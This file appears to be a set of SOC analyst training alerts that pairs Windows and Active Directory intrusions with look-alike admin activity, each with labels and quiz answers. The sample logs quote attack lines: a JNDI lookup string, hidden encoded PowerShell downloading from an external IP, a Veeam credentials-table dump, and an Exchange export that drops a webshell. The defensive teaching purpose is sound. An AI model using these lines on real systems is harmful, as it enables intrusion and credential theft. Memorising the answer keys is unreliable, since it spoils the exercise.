@@ -1,0 +1,282 @@
+# ON SHIFT alerts, drop 3, part 1: Windows endpoint and AD intrusion tradecraft vs the admin operations that look the same (y101-y120)
+- id: y101
+  d: endpoint
+  src: 'Sysmon · Event ID 7'
+  t: 'Print spooler loaded driver module'
+  h: 'SRV-DC-02 · NT AUTHORITY\SYSTEM'
+  l: ['image load: spoolsv.exe (SYSTEM) loaded C:\Windows\System32\spool\drivers\x64\3\New\mscfg.dll, unsigned, hash first seen in the environment today', 'file written 40 s earlier over the network (MS-RPRN) by CORP\j.moreau (standard user) from 10.20.4.77', 'Print Spooler service is running on this domain controller; no printers are published from it', 'next: spoolsv.exe spawned cmd.exe as SYSTEM, which ran whoami /all and net localgroup administrators']
+  v: 1
+  x: T1068
+  c: spooler-driver-load
+  k: [0, 1, 2]
+  diff: 3
+  say: 'The print spooler on a domain controller loaded a new unsigned driver library that a standard user had copied over the network seconds earlier.'
+  tell: 'PrintNightmare in one log: a standard user pushes an unsigned DLL into the spooler driver folder over MS-RPRN, and spoolsv.exe, running as SYSTEM, loads it. The spooler should not even be running on a domain controller, and it spawned cmd.exe as SYSTEM straight away. Disable the spooler on DCs and rebuild what it touched.'
+  q: {kind: contain, ask: 'First containment step?', o: ['Stop and disable the spooler on the DC, isolate the source workstation, then hunt for what the SYSTEM shell did', 'Delete the DLL and close the alert', 'Reinstall the printer driver from the vendor'], a: 0, why: 'Deleting the file leaves the SYSTEM session and the exposed spooler. Fix both, then scope what ran next.'}
+- id: y102
+  d: endpoint
+  src: 'Sysmon · Event ID 7'
+  t: 'Print spooler loaded driver module'
+  h: 'SRV-PRINT-01 · NT AUTHORITY\SYSTEM'
+  l: ['image load: spoolsv.exe (SYSTEM) loaded C:\Windows\System32\spool\drivers\x64\3\unidrv.dll and a vendor driver DLL, both signed (Microsoft Windows Hardware Compatibility Publisher)', 'driver package added with pnputil by CORP\printadm from PAW-IT-01 an hour earlier and staged in the DriverStore from the approved vendor package', 'host is the dedicated print server; Point and Print is limited to approved servers, and the spooler is expected here', 'no child processes from spoolsv.exe; 6 queues now use the driver']
+  v: 0
+  x: T1068
+  c: spooler-driver-load
+  k: [0, 1]
+  diff: 2
+  trap: scary
+  say: 'The print server spooler loaded a vendor driver library after a print admin staged the package from a privileged workstation. No child processes started.'
+  tell: 'A spooler loading driver DLLs is its job, and the print server does it every time someone adds a driver. Signed by the hardware compatibility publisher, staged with pnputil by the print admin from a PAW, and no child process from spoolsv.exe. An unsigned DLL pushed by a standard user onto a domain controller is the other one.'
+- id: y103
+  d: identity
+  src: 'NDR · MS-NRPC (Netlogon)'
+  t: 'Netlogon secure channel anomaly'
+  h: 'SRV-DC-01 · CORP\SRV-DC-01$'
+  l: ['rpc: NetrServerAuthenticate3 to SRV-DC-01 from 10.20.4.77 (WS-DEV-0331, a developer workstation) claiming to be SRV-DC-01$; 312 attempts in 6 s, client credential all zero bytes', 'SRV-DC-01 Security: 4742 computer account SRV-DC-01$ changed, subject ANONYMOUS LOGON, password last set updated outside the 30-day cycle', 'next 2 min: directory replication (DRS GetNCChanges) for the whole domain from 10.20.4.77, authenticated as SRV-DC-01$']
+  v: 1
+  x: T1210
+  c: netlogon-secure-channel
+  k: [0, 1]
+  diff: 3
+  say: 'Hundreds of Netlogon authentication attempts hit a domain controller in six seconds from a developer workstation, then the controller''s machine account password changed.'
+  tell: 'Zerologon, as the wire sees it: hundreds of Netlogon authentications in seconds with an all-zero credential, because the flaw gives roughly a 1 in 256 chance per try. Then the DC''s own machine account password changes under ANONYMOUS LOGON, which no normal password change does, and the same workstation replicates the whole domain. Assume the domain is gone.'
+  q: {kind: contain, ask: 'First move?', o: ['Isolate the source, restore the DC account password, and plan a double krbtgt reset', 'Patch the DC in the next maintenance window', 'Disable the developer''s user account only'], a: 0, why: 'The empty DC password and the replication already happened. Cut the source, repair the DC account, then assume every secret in the domain is exposed.'}
+- id: y104
+  d: identity
+  src: 'NDR · MS-NRPC (Netlogon)'
+  t: 'Netlogon secure channel anomaly'
+  h: 'SRV-DC-01 · CORP\SRV-DC-01$'
+  l: ['SRV-DC-01 System log: Netlogon allowed a vulnerable secure channel connection from machine account NAS-ARC-01$ under the exception policy (event 5830); 3 such events this week, one per session', 'client NAS-ARC-01 (10.20.9.14) is a registered file appliance running Samba whose vendor firmware fix is scheduled; its account is listed in the Netlogon exception policy', 'no 4742 for any domain controller account, no replication requests and no burst of authentication attempts from 10.20.9.14']
+  v: 0
+  x: T1210
+  c: netlogon-secure-channel
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'Netlogon allowed a vulnerable secure channel session from a registered file appliance named in the exception policy, once, with no other activity from that address.'
+  tell: 'The Netlogon hardening events caught old appliances for years after the patch. This is one session from a registered Samba appliance that is named in the exception policy, while nothing resets a DC password and nothing replicates. The attack version is hundreds of tries in seconds and a password change.'
+- id: y105
+  d: identity
+  src: 'Windows Security · 4742'
+  t: 'Computer account name changed'
+  h: 'SRV-DC-01 · CORP\r.baptiste'
+  l: ['event 4741 earlier: computer account WS-TMP01$ created by CORP\r.baptiste (standard user, using the default MachineAccountQuota of 10) from 10.20.6.31', 'event 4742: sAMAccountName of WS-TMP01$ changed to SRV-DC-01 (no trailing $) by the same user; SPNs cleared first', 'event 4768: Kerberos TGT requested for account SRV-DC-01 from 10.20.6.31, then sAMAccountName changed back to WS-TMP01$', 'event 4769: service ticket for cifs/SRV-DC-01.corp.com requested as administrator from the same source']
+  v: 1
+  x: T1068
+  c: samaccountname-rename
+  k: [1, 2]
+  diff: 3
+  say: 'A user created a computer account, renamed it to the domain controller''s name without the dollar sign, requested a Kerberos ticket, and renamed it back.'
+  tell: 'A standard user made a machine account, renamed it to the DC name without the dollar sign, asked for a TGT under that name, then renamed it back so the KDC resolves the follow-up ticket to the real DC account. That is noPac, two 2021 name-handling flaws chained. Quota abuse alone is noise, the rename is the exploit.'
+- id: y106
+  d: identity
+  src: 'Windows Security · 4742'
+  t: 'Computer account name changed'
+  h: 'SRV-DC-01 · CORP\svc_osd_join'
+  l: ['event 4742: sAMAccountName of the computer object changed from DESKTOP-8F3K2L$ to WS-FIN-0455$ (trailing $ kept, new name unused by any other object)', 'subject CORP\svc_osd_join, the deployment-share domain-join account with delegated create and rename rights on OU Workstations-Staging only', 'source MDT-01 during task sequence "Win11 refresh"; object sits in the staging OU; 38 devices renamed this week the same way', 'no TGT or service-ticket request under the old name or any DC name, no 4741 by a user account']
+  v: 0
+  x: T1068
+  c: samaccountname-rename
+  k: [0, 3]
+  diff: 3
+  trap: scary
+  say: 'The domain-join service account renamed a new computer object during imaging, keeping the dollar sign, in the staging container, like 38 other devices this week.'
+  tell: 'Renames are normal during imaging: the device arrives as DESKTOP-something and receives its asset name. What matters is the kept dollar sign, a name no other object uses, no Kerberos requests under the old name, and a delegated join account working only in the staging OU. A rename to a DC name is noPac.'
+- id: y107
+  d: email
+  src: 'Exchange · Admin audit log'
+  t: 'Mailbox export request'
+  h: 'SRV-EXCH-02 · CORP\administrator'
+  l: ['cmdlet: New-MailboxExportRequest -Mailbox administrator -FilePath \\localhost\c$\inetpub\wwwroot\aspnet_client\sys.aspx', 'a New-ManagementRoleAssignment for "Mailbox Import Export" ran 2 min earlier; the IIS log shows /autodiscover/autodiscover.json with an @ in the query from 45.x.x.x just before', 'new file C:\inetpub\wwwroot\aspnet_client\sys.aspx, 41 KB, PST framing around ASP.NET script markers', 'GET /aspnet_client/sys.aspx from 45.x.x.x returned 200 fifteen seconds later']
+  v: 1
+  x: T1505.003
+  c: exchange-pst-export-path
+  k: [0, 1, 2]
+  diff: 3
+  say: 'An Exchange mailbox export request wrote its output into the web root instead of a file share, minutes after a management role assignment.'
+  tell: 'ProxyShell leaves this signature: a Mailbox Import Export role assignment minutes earlier, then an export request whose destination is the web root instead of a share, which produces an .aspx file that is a webshell wrapped in PST framing. The follow-up GET returning 200 means it is live. Check every Exchange server for similar files.'
+  q: {kind: pivot, ask: 'First pivot?', o: ['Hunt every Exchange server for new .aspx files under aspnet_client and the OWA auth folder, and check patch level', 'Delete sys.aspx and move on', 'Reset the administrator password'], a: 0, why: 'The same chain can drop several shells on several servers. Find them all and close the hole before cleaning one file.'}
+- id: y108
+  d: email
+  src: 'Exchange · Admin audit log'
+  t: 'Mailbox export request'
+  h: 'SRV-EXCH-02 · CORP\exch.admin2'
+  l: ['cmdlet: New-MailboxExportRequest -Mailbox j.salazar -FilePath \\FS-LEGAL-01\pst-holds\j.salazar_2026Q3.pst', 'caller CORP\exch.admin2 from PAW-EXCH-01, a member of the Organization Management role group for 3 years; the Mailbox Import Export role was assigned at deployment, no role change in the last 24 h', 'destination is the legal hold share (ACL: the e-discovery group plus Exchange Trusted Subsystem, which exports require), file is a real PST, 2.1 GB', 'request came through the admin PowerShell session on the PAW, no web-facing request involved']
+  v: 0
+  x: T1114.002
+  c: exchange-pst-export-path
+  k: [0, 2]
+  diff: 3
+  trap: scary
+  say: 'An Exchange admin exported a mailbox to a PST on the legal hold share from a privileged workstation, same cmdlet as earlier holds.'
+  tell: 'ProxyShell abused this same cmdlet, and legal still needs PSTs. Judge the destination: a legal hold share with a proper ACL, a real PST of plausible size, an admin with years of tenure on a PAW, and no role assignment or web request beforehand. The web root with an .aspx name is the attack.'
+- id: y109
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceProcessEvents'
+  t: 'Shell spawned by Java service'
+  h: 'SRV-HZN-01 · NT AUTHORITY\SYSTEM'
+  l: ['parent: ws_TomcatService.exe (VMware Horizon Connection Server) → java.exe', 'cmd: powershell.exe -nop -w hidden -ep bypass -enc JABjAD0AbgBlAHcA… (decodes to a download from http://185.x.x.x/a.ps1)', 'about 30 s earlier: a request header containing ${jndi:ldap://185.x.x.x:1389/x} and an outbound LDAP connection from this server to 185.x.x.x', 'log4j-core 2.14.1 on disk, remediation not applied; the server is internet-facing']
+  v: 1
+  x: T1190
+  c: java-service-child-shell
+  k: [1, 2]
+  diff: 3
+  say: 'The Horizon service worker launched hidden PowerShell with an encoded command thirty seconds after a request with a lookup string and an outbound LDAP call.'
+  tell: 'Log4Shell on Horizon, in one picture: a header with a ${jndi:ldap://...} string, an outbound LDAP call from the server to the same 185.x.x.x address, then the Tomcat service worker running hidden encoded PowerShell on an unpatched log4j-core. Reports on exposed Horizon servers describe exactly this chain, tool downloads included.'
+- id: y110
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceProcessEvents'
+  t: 'Shell spawned by Java service'
+  h: 'SRV-CI-04 · NT AUTHORITY\SYSTEM'
+  l: ['parent: java.exe -jar agent.jar (Jenkins agent service, WinSW wrapper jenkins-agent.exe) on the build agent', 'cmd: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\jenkins\workspace\billing-api\build\package.ps1', 'children: msbuild.exe and signtool.exe from the workspace; downloads only from the internal artifact repository nexus.corp.com', 'log4j-core 2.17.1 on disk; no JNDI strings in request headers and no outbound LDAP from this host in 30 days']
+  v: 0
+  x: T1059.001
+  c: java-service-child-shell
+  k: [1, 2, 3]
+  diff: 2
+  trap: scary
+  say: 'A build agent ran a PowerShell packaging script from its workspace, called the compiler and signing tool, and fetched only from the internal artifact repository.'
+  tell: 'Build agents are Java processes that run scripts all day. This one runs a script from its own workspace, spawns msbuild and signtool, talks only to the internal artifact repository, and has a fixed log4j-core with no JNDI strings or outbound LDAP. Same parent type as an exploited server, opposite evidence.'
+- id: y111
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceProcessEvents'
+  t: 'Backup database credentials query'
+  h: 'SRV-VBR-01 · CORP\a.lindgren'
+  l: ['cmd: powershell.exe → sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q "SELECT user_name,password FROM [VeeamBackup].[dbo].[Credentials]", parent explorer.exe in an RDP session from WS-IT-0210', 'the script then calls ProtectedData.Unprotect (DPAPI, machine scope) on every returned password value; the Veeam services are not involved', 'CORP\a.lindgren is a domain admin, first logon to this backup server in 200 days', 'output: 14 rows including 6 domain service accounts and the hypervisor admin, written to C:\Windows\Temp\v.txt']
+  v: 1
+  x: T1555
+  c: backup-credential-read
+  k: [0, 1, 2]
+  diff: 3
+  trap: bland
+  say: 'A domain admin read the Veeam credentials table with sqlcmd and ran a script to decrypt the values into a temp file.'
+  tell: 'It looks like a DBA query until you read the table: dbo.Credentials in the VeeamBackup database holds every stored login, and the DPAPI unprotect on the same host turns them into plaintext. Ransomware crews use the backup server as a password vault, and a 2023 unauthenticated Veeam flaw gave the same loot with no logon at all. A first logon in 200 days and a temp file seal it.'
+  q: {kind: contain, ask: 'Best containment?', o: ['Rotate every credential stored in Veeam, starting with domain and hypervisor admins, and isolate the backup server', 'Rotate only a.lindgren''s password', 'Delete v.txt and re-run the backup job'], a: 0, why: 'Every stored login in that table is now exposed, not one account. Rotate them all and cut the host off.'}
+- id: y112
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceProcessEvents'
+  t: 'Backup database credentials query'
+  h: 'SRV-VBR-01 · NT SERVICE\VeeamBackupSvc'
+  l: ['process: Veeam.Backup.Service.exe (signed Veeam Software Group GmbH) reads [VeeamBackup].[dbo].[Credentials] over the local SQL connection as part of the scheduled configuration backup', 'login: NT SERVICE\VeeamBackupSvc, the product''s service account; no interactive session, and no sqlcmd or PowerShell on the host', 'output: encrypted .bco file (password-protected, 30 MB) written to \\NAS-BKP-01\vbr-config, no plaintext output', 'job runs at 03:00 daily; the same read appears every night for 410 nights']
+  v: 0
+  x: T1555
+  c: backup-credential-read
+  k: [0, 2]
+  diff: 3
+  trap: scary
+  say: 'The backup service read its credentials table for the nightly configuration backup, writing an encrypted file to the NAS, as on 410 nights.'
+  tell: 'Reading the credentials table is also what the product does when it builds its configuration backup. Here the reader is the signed Veeam service under its own account, nothing is interactive, the output is an encrypted .bco on the NAS, and there are 410 nights of history. A script with sqlcmd and an unprotect call is the theft.'
+- id: y113
+  d: endpoint
+  src: 'Sysmon · Event ID 1'
+  t: 'Password-protected archive created'
+  h: 'SRV-FS-03 · CORP\adm_dpierce'
+  l: ['cmd: C:\ProgramData\7z\7z.exe a -tzip -mx1 -v500m -p[redacted] C:\PerfLogs\fin.zip \\SRV-FS-03\Finance$\* \\SRV-FS-03\HR\*', 'logon: CORP\adm_dpierce, type 3 (network, via WinRM), first use of this account on a file server', '7z.exe is a copy under ProgramData, not in the software catalog; 41 volumes of 500 MB written to C:\PerfLogs in 12 min', 'Finance$ and HR hold payroll and personnel files; this account has never read either share']
+  v: 1
+  x: T1560.001
+  c: staging-archive-scope
+  k: [0, 2, 3]
+  diff: 3
+  trap: bland
+  say: 'A private 7-Zip copy wrote a password-protected split archive of the finance and personnel shares into the PerfLogs folder.'
+  tell: 'Dull on purpose: 7-Zip with a password and split volumes. The tells are around it: a private copy under ProgramData, output in C:\PerfLogs, a classic staging folder, two sensitive shares this account has never touched, and 20 GB in 12 minutes. Ransomware crews stage like this before the exfil tool, so catch it here, not at the upload.'
+  q: {kind: pivot, ask: 'First pivot?', o: ['Check for an upload tool and outbound traffic from this server, and where adm_dpierce was used before', 'Wait for the archive to finish and review it', 'Ask Finance whether they requested an archive'], a: 0, why: 'Staging is the step before exfil. Catch the outbound leg and trace the account.'}
+- id: y114
+  d: endpoint
+  src: 'Sysmon · Event ID 1'
+  t: 'Password-protected archive created'
+  h: 'SRV-FS-03 · CORP\svc_archive'
+  l: ['cmd: "C:\Program Files\7-Zip\7z.exe" a -t7z -mhe=on -p<vault> D:\Archive\FIN\2026Q3.7z E:\Finance\2026Q3\*', 'parent: Task Scheduler job "Quarter-end archive" created 2 years ago, runs on the third business day after quarter close; svc_archive owns the Finance share', '7z.exe is the signed 7-Zip from the software client; output stays on the D: archive volume (WORM share), 6 GB', 'no outbound transfer; the backup agent picks the archive up that night; same job and size range for 11 quarters']
+  v: 0
+  x: T1560.001
+  c: staging-archive-scope
+  k: [0, 1, 2, 3]
+  diff: 3
+  trap: scary
+  say: 'A scheduled quarter-end job used the installed 7-Zip to encrypt the finance share into the archive volume, with no outbound transfer.'
+  tell: 'Same 7-Zip, same password flag, opposite everything else: the job was scheduled two years ago, the binary is the catalog copy, the source is the one share the account exists for, the output stays on the WORM archive volume, and no transfer follows. Compare the split volumes in PerfLogs.'
+- id: y115
+  d: endpoint
+  src: 'Sysmon · Event ID 1'
+  t: 'Password-protected archive created'
+  h: 'SRV-ERP-02 · CORP\k.fontaine'
+  l: ['cmd: 7z.exe a -tzip -p[redacted] D:\Temp\erp-diag.zip D:\ERP\logs\2026-11\*.log D:\ERP\config\*.xml', 'run by CORP\k.fontaine (ERP platform engineer) in an interactive session on the ERP server; 7-Zip is the catalog install', 'output 180 MB, only application log and config folders; the file was then uploaded in the browser to the ERP vendor''s support portal (vendor domain on the allowlist) and deleted', 'no network shares read, no split volumes, nothing else staged']
+  v: 0
+  x: T1560.001
+  c: staging-archive-scope
+  k: [0, 2]
+  diff: 2
+  trap: scary
+  say: 'An ERP engineer zipped a month of application logs and config files with a password, 180 megabytes, and uploaded it to the vendor support portal.'
+  tell: 'Password-protected zips of logs go to vendor support all week. The source is the application''s own log and config folders, 180 MB, one file, uploaded once to an allowlisted vendor portal and deleted. Compare size, source shares and the staging folder in the other one.'
+- id: y116
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceNetworkEvents'
+  t: 'Directory and SMB enumeration burst'
+  h: 'WS-HR-0338 · CORP\l.petit'
+  l: ['process: C:\Users\l.petit\AppData\Local\Temp\svchost32.exe, unsigned, PE original filename SharpHound.exe, first execution of this hash in the environment', 'network: LDAP queries to 3 DCs for all users, groups, computers, GPOs and trusts, then SMB/RPC to 1,900 hosts in 9 min (session and local group enumeration)', 'output: 20261109031412_BloodHound.zip created in the same folder, 14 MB', 'l.petit is an HR analyst with no admin tooling history']
+  v: 1
+  x: T1087.002
+  c: ad-recon-sweep
+  k: [0, 1]
+  diff: 3
+  say: 'An HR workstation process named like a system service queried the directory over LDAP, then reached 1,900 hosts over SMB and wrote a zip.'
+  tell: 'A renamed SharpHound: an unsigned svchost32.exe with the original filename in its metadata, LDAP for the whole directory, then 1,900 hosts touched over SMB for sessions and local admins, and a BloodHound zip at the end. That is attack-path mapping from a user workstation, and the next step is the shortest route to domain admin.'
+  q: {kind: pivot, ask: 'First pivot?', o: ['Find how the binary landed on WS-HR-0338 and what else that user session ran', 'Ask l.petit to uninstall the tool', 'Block LDAP from all workstations'], a: 0, why: 'Recon means someone is already inside. Trace the entry point and the follow-on activity.'}
+- id: y117
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceNetworkEvents'
+  t: 'Directory and SMB enumeration burst'
+  h: 'PAW-SEC-02 · CORP\sec.eng3'
+  l: ['process: C:\Tools\PingCastle\PingCastle.exe, hash matches the release approved in the tool catalog, run from the security jump host PAW-SEC-02', 'network: LDAP to 3 DCs plus SMB and RPC to the DCs only; no connections to member servers or workstations', 'output: ad_hc_corp.com.html report written to the security team share', 'CORP\sec.eng3 is in Security Engineering; the quarterly AD health check is on the team calendar']
+  v: 0
+  x: T1087.002
+  c: ad-recon-sweep
+  k: [0, 1]
+  diff: 2
+  trap: scary
+  say: 'A security engineer ran the approved AD assessment tool from the jump host, querying only the domain controllers and writing an HTML report.'
+  tell: 'Directory enumeration from a security tool: PingCastle run from the security jump host, hash from the approved catalog, queries going to the DCs only, and an HTML health report on the team share. Compare the sweep of 1,900 hosts from an HR workstation.'
+- id: y118
+  d: endpoint
+  src: 'Defender for Endpoint · DeviceNetworkEvents'
+  t: 'Directory and SMB enumeration burst'
+  h: 'SCAN-NESSUS-01 · CORP\svc_vulnscan'
+  l: ['source 10.30.5.20 is SCAN-NESSUS-01, a registered scanner appliance; SMB and RPC to 2,100 hosts between 01:00 and 05:00 on Sunday', 'authentication: CORP\svc_vulnscan (local administrator through a GPO), 4624 type 3 on each host, remote registry service started and stopped per host', 'scan policy "Weekly credentialed Windows" owned by vulnerability management; scope is the listed subnets; same pattern every Sunday for 90 weeks', 'no LDAP queries for all users, groups or trusts; no archive output on any host']
+  v: 0
+  x: T1018
+  c: ad-recon-sweep
+  k: [0, 2]
+  diff: 3
+  trap: scary
+  say: 'A registered scanner authenticated to 2,100 hosts over SMB in its Sunday window and started remote registry on each, as it has for 90 weeks.'
+  tell: 'SharpHound''s SMB sweep looks like this too, and a credentialed scan even starts the remote registry. The differences: a registered scanner IP, a policy and window owned by vulnerability management, a service account built for it, 90 identical weekly runs, and no directory-wide LDAP harvest or zip output.'
+  q: {kind: tune, ask: 'Best tuning?', o: ['Suppress by scanner IP and service account only inside the scan window and scope', 'Suppress all SMB sweeps from any source', 'Disable the weekly scan'], a: 0, why: 'Bind the exception to source, account and window, so the same sweep from a workstation still fires.'}
+- id: y119
+  d: endpoint
+  src: 'ConfigMgr · Audit status messages'
+  t: 'Required application deployment created'
+  h: 'SCCM-SITE01 · CORP\svc_inventory'
+  l: ['audit: application "WinUpdateHelper" created and deployed as Required (deadline: as soon as possible) to collection "All Systems"; the install command runs as System: \\SCCM-SITE01\sources$\wuh\setup.exe /s', 'actor: CORP\svc_inventory, added to the Full Administrator role 25 min earlier; first console session in its history, from WS-ACCT-0718', 'content: unsigned executable copied to the source share 10 min earlier by the same account; no software catalog record and no pilot collection deployment first', 'in 6 min, 5,400 of 6,100 clients started the install through CcmExec; vssadmin and bcdedit process starts follow across the fleet']
+  v: 1
+  x: T1072
+  c: mass-deploy-collection
+  k: [0, 1]
+  diff: 3
+  say: 'A service account promoted to Full Administrator minutes earlier deployed an unsigned installer as required software to every client.'
+  tell: 'Ransomware crews love the management server because it already has SYSTEM on every client. A service account promoted to Full Administrator 25 minutes ago created a Required deployment of an unsigned binary to All Systems, skipped the pilot, and within six minutes most clients ran it, followed by vssadmin and bcdedit. Kill the deployment and isolate the site server.'
+  q: {kind: contain, ask: 'Best containment?', o: ['Disable the deployment, isolate the site server and svc_inventory, then stop clients that already started it', 'Wait for the deployment to finish and scan clients afterwards', 'Remove svc_inventory from the Full Administrator role only'], a: 0, why: 'The deployment is still reaching clients. Stop the distribution first, then deal with the account and the site server.'}
+- id: y120
+  d: endpoint
+  src: 'ConfigMgr · Audit status messages'
+  t: 'Required application deployment created'
+  h: 'SCCM-SITE01 · CORP\sccm.admin2'
+  l: ['audit: application "7-Zip 24.08 (x64 MSI)" deployed as Required (deadline: Saturday 22:00, inside the maintenance window) to collection "Pilot-Ring0", 45 devices', 'actor: CORP\sccm.admin2, Full Administrator for 4 years, console session from PAW-IT-02 with the usual console history', 'content: vendor MSI imported from the software catalog source, signature verified at import and hash matches the vendor download; ring 1 follows 7 days after ring 0 compliance reaches 95%', 'uninstall and detection rules are defined; no deployment to All Systems or any other collection']
+  v: 0
+  x: T1072
+  c: mass-deploy-collection
+  k: [0, 2]
+  diff: 3
+  trap: scary
+  say: 'An experienced administrator deployed a signed 7-Zip package as required software to a 45-device pilot collection with a Saturday maintenance window deadline.'
+  tell: 'The console action that spreads ransomware also ships 7-Zip every month. Here it is a pilot collection of 45 devices, a signed vendor MSI with a verified hash, an admin with four years of console history on a PAW, a maintenance-window deadline and a ring plan.'
